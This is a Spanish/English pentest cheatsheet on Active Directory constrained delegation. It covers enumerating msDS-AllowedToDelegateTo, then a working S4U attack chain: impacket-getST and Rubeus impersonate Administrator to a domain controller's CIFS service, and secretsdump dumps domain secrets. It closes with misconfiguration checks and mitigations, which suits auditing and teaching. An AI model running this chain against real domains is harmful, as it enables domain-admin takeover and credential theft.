---
aliases:
  - Constrained Delegation
  - S4U2Self
  - S4U2Proxy
  - msDS-AllowedToDelegateTo
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
---
# AD - Delegation Enumeration - Constrained Delegation (S4U)

***

## Concept Overview

| **Aspecto** | **Detalle** | **Importancia** |
|:---:|:---:|:---:|
| Atributo | `msDS-AllowedToDelegateTo` (lista de SPNs target) | Filter principal. |
| UAC flag | `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x1000000 / 16777216) si protocol transition | Bitwise. |
| Mecanismo | S4U2Self → service ticket as victim. S4U2Proxy → forward ticket a target service. | Standard. |
| Modes | Kerberos only (sin protocol transition) vs Use any auth protocol (protocol transition) | Hardening difference. |
| Default | Off — debe configurarse explícito | Audit. |
^ad-cd-concept

___

## msDS-AllowedToDelegateTo Attribute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter * -Pr msDS-AllowedToDelegateTo \| ? msDS-AllowedToDelegateTo` | Users con CD | Audit. |
| `Get-ADComputer -Filter * -Pr msDS-AllowedToDelegateTo \| ? msDS-AllowedToDelegateTo` | Computers con CD | Audit. |
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(msDS-AllowedToDelegateTo=*)" samAccountName msDS-AllowedToDelegateTo userAccountControl` | LDAP raw bulk | Linux. |
| `nxc ldap <DC> -u u -p p --query "(msDS-AllowedToDelegateTo=*)" "samAccountName,msDS-AllowedToDelegateTo,userAccountControl"` | netexec wrapper | Quick. |
^ad-cd-attr

```powershell
# Comprehensive CD audit (users + computers)
Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" \
  -Properties samAccountName,msDS-AllowedToDelegateTo,userAccountControl |
  Select samAccountName,
         @{n='Targets';e={$_.'msDS-AllowedToDelegateTo' -join '; '}},
         @{n='Mode';e={
           if ($_.userAccountControl -band 0x1000000) { "ProtocolTransition" }
           else { "KerberosOnly" }
         }}
```

___

## Use Kerberos Only vs Protocol Transition

| **Modo** | **UAC bit** | **Diferencia** |
|:---:|:---:|:---:|
| **Use Kerberos only** | Sin `TRUSTED_TO_AUTH_FOR_DELEGATION` | Service necesita TGS forwardable del user (auth real Kerberos). |
| **Use any auth protocol** (protocol transition) | `0x1000000` set | Service puede pedir TGS via S4U2Self **sin** TGT del user. **Más permisivo**. |
^ad-cd-modes

**Por qué importa atacante:** Protocol Transition + CD = atacante con control del service account puede impersonar a cualquier user (incluso Domain Admin) hacia los SPNs en `msDS-AllowedToDelegateTo`. Sin protocol transition: necesita capturar TGS forwardable real.

```bash
# Filter solo CD con protocol transition (más explotable)
ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" \
  "(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
  samAccountName msDS-AllowedToDelegateTo
```

___

## S4U2Self + S4U2Proxy Chain

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Comprometer service account con CD | Hash NT / TGT del service account | Pre-attack. |
| 2. S4U2Self request: TGS service account → service account, impersonando victim | `getST.py -spn <self-SPN> -impersonate Administrator -dc-ip <DC> corp.local/<svc>:<pass>` | Linux. |
| 3. S4U2Proxy request: forwarded TGS → target SPN en `msDS-AllowedToDelegateTo` | Mismo `getST.py` (auto chain). | Linux. |
| 4. Use TGS para access target service como victim | `KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass <target>` | Standard. |
^ad-cd-s4u

```bash
# Pipeline Linux completo
SVC='svc-iis$'  # o user-style
SVCPASS='ServicePass!'
TARGET='cifs/dc01.corp.local'  # SPN en msDS-AllowedToDelegateTo

# 1. S4U chain (TGS for Administrator → target)
impacket-getST -spn "$TARGET" \
  -impersonate Administrator \
  -dc-ip <DC> \
  "corp.local/$SVC:$SVCPASS"

# 2. Use TGS
export KRB5CCNAME=Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache
impacket-secretsdump -k -no-pass dc01.corp.local
```

```cmd
:: Windows con Rubeus
Rubeus.exe s4u /user:svc-iis /rc4:<NT-hash> ^
  /impersonateuser:Administrator ^
  /msdsspn:cifs/dc01.corp.local ^
  /ptt
:: Use ticket
dir \\dc01\C$
```

___

## Privileged CD Identification

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Pr msDS-AllowedToDelegateTo \| ? msDS-AllowedToDelegateTo -match "(?i)cifs.*dc\|ldap.*dc\|host.*dc"` | CD apuntando a DCs (critical) | Direct DA path. |
| `Get-ADUser -Filter {AdminCount -eq 1} -Pr msDS-AllowedToDelegateTo \| ? msDS-AllowedToDelegateTo` | Priv user con CD (cross-correlate) | Critical. |
| `Get-ADObject -LDAPFilter "(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))"` | CD + Protocol Transition | Más explotable. |
^ad-cd-privileged

```powershell
# CD apuntando a Tier 0 services
Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo |
  Where {
    $_.'msDS-AllowedToDelegateTo' -match "(?i)cifs/.*dc|ldap/.*dc|host/.*dc|krbtgt"
  } |
  Select Name,@{n='Targets';e={$_.'msDS-AllowedToDelegateTo' -join '; '}}
```

___

## BloodHound CD Visualization

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u)-[:AllowedToDelegate]->(c:Computer) RETURN u.name,c.name` | CD edges | Audit. |
| `MATCH (u {hasspn:true})-[:AllowedToDelegate]->(c:Computer {highvalue:true}) RETURN u,c` | Service account con CD a high-value | Critical. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(c:Computer {highvalue:true})) WHERE any(r IN relationships(p) WHERE type(r) = "AllowedToDelegate") RETURN p` | Privesc paths via CD | Path. |
^ad-cd-bh

___

## Common Misconfigurations

| **Comando** | **Qué detecta** | **Riesgo** |
|:---:|:---:|:---:|
| `Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Pr msDS-AllowedToDelegateTo \| ? msDS-AllowedToDelegateTo -match "(?i)cifs/.*dc"` | CD a DC SMB (catastrofic) | **CRITICAL**. |
| Service account con CD + weak password | Crackeable hash → S4U → DA | Critical chain. |
| CD configurado a SPN inexistente | Ghost SPN — atacante puede crear | Edge. |
| CD + protocol transition + non-Tier-0 service | Wide attack surface | Audit. |
^ad-cd-misconfig

___

## Mitigations

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Set-ADAccountControl -Identity <user> -TrustedToAuthForDelegation $false` | Disable Protocol Transition | Hardening. |
| `Set-ADUser <user> -Clear msDS-AllowedToDelegateTo` | Remove CD entirely | Reset. |
| `Add-ADGroupMember "Protected Users" -Members <victim>` | Block delegation hacia members | Modern hardening. |
| `Set-ADAccountControl -Identity <victim> -AccountNotDelegated $true` | Mark cuenta como non-delegable | Tier 0 hardening. |
| Use gMSA en lugar de user-style service account | Auto-rotate pwd | Reduce hash exposure. |
^ad-cd-mitigations

***
